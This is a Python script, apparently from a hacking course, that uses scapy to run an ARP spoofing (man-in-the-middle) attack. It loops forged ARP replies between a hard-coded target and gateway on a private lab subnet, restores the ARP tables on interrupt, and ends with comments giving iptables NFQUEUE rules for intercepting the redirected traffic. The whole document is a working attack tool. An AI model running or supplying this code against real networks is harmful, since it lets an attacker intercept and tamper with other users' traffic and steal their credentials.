#!/usr/bin/env python
import time

import scapy.all as scapy


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


target_ip = "192.168.88.131"
gateway_ip = "192.168.88.2"

try:
    sent_packets_count = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_count += 2
        print(f"\r[+] Packets sent: {sent_packets_count}", end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[+] Detected control-C ......Resetting ARP tables please wait!")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)

# When running make sure you forward the packets using:
# --- When using non-local testing ---
# iptables -I FORWARD -j NFQUEUE --queue-num (set queue num usually 0)
# --- When using LOCAL testing ---
# iptables -I OUTPUT -j NFQUEUE --queue-num (set queue num usually 0)
# iptables -I INPUT -j NFQUEUE --queue-num (set queue num usually 0)
# --- When finished ---
# iptables --flush (to clear queue)
